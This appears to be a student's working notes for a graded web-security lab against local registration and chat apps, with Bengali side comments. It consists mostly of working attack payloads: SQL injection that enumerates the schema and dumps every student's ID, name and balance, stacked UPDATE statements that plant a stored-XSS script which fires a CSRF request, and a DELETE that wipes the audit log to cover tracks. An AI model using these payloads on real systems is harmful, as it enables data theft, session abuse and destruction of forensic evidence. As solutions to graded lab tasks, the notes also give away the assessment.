@@ -1,0 +1,132 @@
+attacker : 9900001 reg-isha-29 
+victim : 9900002 reg-fahim-29
+
+
+1.
+Database extraction (2 marks): Demonstrate SQL injection 
+and extract every student’s ID,
+name, and outstanding balance through the attacker 
+submission channel.
+
+
+reg-isha-29' AND '1' = '1
+reg-isha-29' AND '1' = '0
+
+
+reg-isha-29' order by 1 limit 1 -- -
+1 , 2, ... check. 6 e paina kichu.
+//5 ta colm
+
+' union select 1,2,3,4, 5 -- -
+//3,4,5 dekhay
+
+DB _name : c1_registration
+' union select 1,2,DATABASE(),'',5 -- -
+
+shob table dekhte :
+' union select 1,2,GROUP_CONCAT(table_name),'',5 from information_schema.tables where table_schema = DATABASE() -- -
+tables : log,registration
+
+column name :
+' union select 1,2,GROUP_CONCAT(column_name),'',5 from information_schema.columns where table_name = 'log' -- -
+log table colm : attempted_at,id,submitted_id,submitted_secret
+registration : balance_due,first_name,last_name,reg_pin,student_id
+
+
+
+Demonstrate SQL injection 
+and extract every student’s ID,
+name, and outstanding balance through the attacker 
+submission channel.
+
+' union select 1,'',GROUP_CONCAT(student_id,' ',first_name,' ',last_name,' : $',balance_due SEPARATOR '<br>'),'',5 FROM registration -- -
+
+porergula :   WHERE student_id > '9900030' -- -
+
+' UNION SELECT
+1,
+'',
+GROUP_CONCAT(
+    student_id,' ',first_name,' ',last_name,' : $',balance_due
+    SEPARATOR '<br>'
+),
+'',
+5
+FROM registration
+WHERE student_id > 9900030
+-- -
+
+
+
+2.
+Use a stacked statement to persist the first browser payload in
+student 9900001’s own registration record.
+
+registration : balance_due,first_name,last_name,reg_pin,student_id
+
+reg-isha-29'; UPDATE registration SET last_name=last_name WHERE student_id=9900001; -- -
+reg-isha-29'; UPDATE registration SET last_name='SenTEST' WHERE student_id=9900001; -- -
+reg-isha-29'; UPDATE registration SET last_name='Sen' WHERE student_id=9900001; -- -
+
+
+3.
+CSRF carrying executable content (3 marks): A normal status 
+check by the attacker must cause the Chat to store a second 
+script message under the attacker’s active Chat session.
+Manually posting the script does not count
+
+await fetch("http://localhost:3001/send", {
+    "credentials": "include",
+    "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "referrer": "http://localhost:3001/",
+    "body": "message=2",
+    "method": "POST"
+});
+
+message=<script>document.title="C1-SECOND-ORDER-XSS";</script> er encoded form pete
+console e : encodeURIComponent('<script>document.title="C1-SECOND-ORDER-XSS";</script>')
+ "%3Cscript%3Edocument.title%3D%22C1-SECOND-ORDER-XSS%22%3B%3C%2Fscript%3E" eta pabo
+
+reg-isha-29'; UPDATE registration SET last_name = CONCAT(
+  '<script>fetch("http://localhost:3001/send", {"headers": {"content-type": "application/x-www-form-urlencoded"}, 
+  "body": "message=%3Cscript%3Edocument.title%3D%22C1-SECOND-ORDER-XSS%22%3B%3C%2Fscript%3E", 
+  "method": "POST", "credentials": "include"});</script>'
+) WHERE student_id=9900001; -- -
+
+
+[Trigger — same browser, stay logged into Chat as isha.sen, then load the
+ Registration Portal URL directly (address bar):]
+
+http://localhost:3000/?student_id=9900001&reg_pin=reg-isha-29
+
+
+
+4. 
+Task 4 — Independent-viewer execution
+====================================================================
+incognito
+[Chat http://localhost:3001/login — log in ONLY here, as fahim.mirza / chat-Fahim-29,
+ do not touch Registration Portal — then just load the feed page:]
+
+http://localhost:3001/
+-> tab title should change to C1-SECOND-ORDER-XSS
+
+
+
+5.
+Discover the forensic trail left by registration submissions
+and delete only records attributable to student 9900001 through the same injection channel. All
+other evidence must remain
+
+
+log table colm : attempted_at,id,submitted_id,submitted_secret
+registration : balance_due,first_name,last_name,reg_pin,student_id
+
+' union select 1,2,GROUP_CONCAT(column_name),' ', 5 FROM information_schema.columns WHERE table_name='log' -- -
+reg-isha-29'; DELETE FROM log WHERE submitted_id=9900001; -- -
+
+
+
+
